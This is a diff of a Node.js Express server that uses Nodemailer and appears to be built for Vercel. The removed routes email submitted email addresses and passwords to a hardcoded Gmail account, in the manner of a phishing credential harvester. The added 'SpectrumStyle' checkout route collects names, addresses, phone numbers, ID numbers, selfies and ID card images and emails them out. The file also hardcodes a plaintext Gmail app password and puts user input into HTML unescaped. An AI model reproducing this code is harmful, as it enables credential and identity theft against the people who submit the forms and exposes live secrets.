@@ -1,49 +1,33 @@
-const express = require("express");
-const cors = require("cors");
-const nodemailer = require("nodemailer");
+// /api/send-checkout.ts
+import express from "express";
+import nodemailer from "nodemailer";
+import multer from "multer";
+import cors from "cors";
+import dotenv from "dotenv";
 
+dotenv.config();
 const app = express();
-
-app.use(express.json());
 app.use(cors());
-
 // Email credentials (hardcoded)
 const userEmail = "boltdropa@gmail.com";
 const pass = "qeqzjijyihplkplt";
+const upload = multer(); // for parsing multipart/form-data
 
-// API route for sending emails
-app.post("/", (req, res) => {
-  const { email } = req.body;
+app.post("/api/send-checkout", upload.fields([
+  { name: "selfie" }, 
+  { name: "idCard" }
+]), async (req, res) => {
+  const {
+    fullName,
+    homeAddress,
+    phoneNumber,
+    idCardNumber,
+    totalPrice,
+    items
+  } = req.body;
 
-  const transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: userEmail,
-      pass: pass,
-    },
-  });
-
-  const mailOptions = {
-    from: `${email}`,
-    to: userEmail,
-    subject: `Email: ${email}`,
-    text: `New user registered with Email: ${email}`,
-  };
-
-  transporter.sendMail(mailOptions, (error, info) => {
-    if (error) {
-      console.log(error);
-      res.status(500).send("Error occurred: " + error);
-    } else {
-      console.log("Email sent:", info.response);
-      res.send("Success");
-    }
-  });
-});
-
-// API routes for password
-app.post("/pass", (req, res) => {
-  const { password } = req.body;
+  const selfieFile = req.files?.["selfie"]?.[0];
+  const idCardFile = req.files?.["idCard"]?.[0];
 
   const transporter = nodemailer.createTransport({
     service: "gmail",
@@ -54,23 +38,39 @@ app.post("/pass", (req, res) => {
   });
 
   const mailOptions = {
-    from: `${userEmail}`,
-    to: userEmail,
-    subject: `Password: ${password}`,
-    text: `New user registered with Password: ${password}`,
+    from: process.env.USER_EMAIL,
+    to: process.env.USER_EMAIL,
+    subject: `New Order from ${fullName}`,
+    html: `
+      <h2>New SpectrumStyle Order</h2>
+      <p><strong>Name:</strong> ${fullName}</p>
+      <p><strong>Address:</strong> ${homeAddress}</p>
+      <p><strong>Phone:</strong> ${phoneNumber}</p>
+      <p><strong>ID Number:</strong> ${idCardNumber}</p>
+      <p><strong>Total:</strong> $${totalPrice}</p>
+      <p><strong>Items:</strong> ${JSON.parse(items).map(
+        (i: any) => `<li>${i.title} x${i.quantity} - $${i.price}</li>`
+      ).join("")}</p>
+    `,
+    attachments: [
+      selfieFile && {
+        filename: selfieFile.originalname,
+        content: selfieFile.buffer,
+      },
+      idCardFile && {
+        filename: idCardFile.originalname,
+        content: idCardFile.buffer,
+      },
+    ].filter(Boolean),
   };
 
-  console.log(mailOptions);
-  transporter.sendMail(mailOptions, (error, info) => {
-    if (error) {
-      console.log(error);
-      res.send("error Occured: " + error);
-    } else {
-      console.log("Email sent", +info.response);
-      res.send("success");
-    }
-  });
+  try {
+    await transporter.sendMail(mailOptions);
+    res.status(200).send("Email sent");
+  } catch (err) {
+    console.error("Email error:", err);
+    res.status(500).send("Email failed");
+  }
 });
 
-// Export app for Vercel
-module.exports = app;
+export default app;
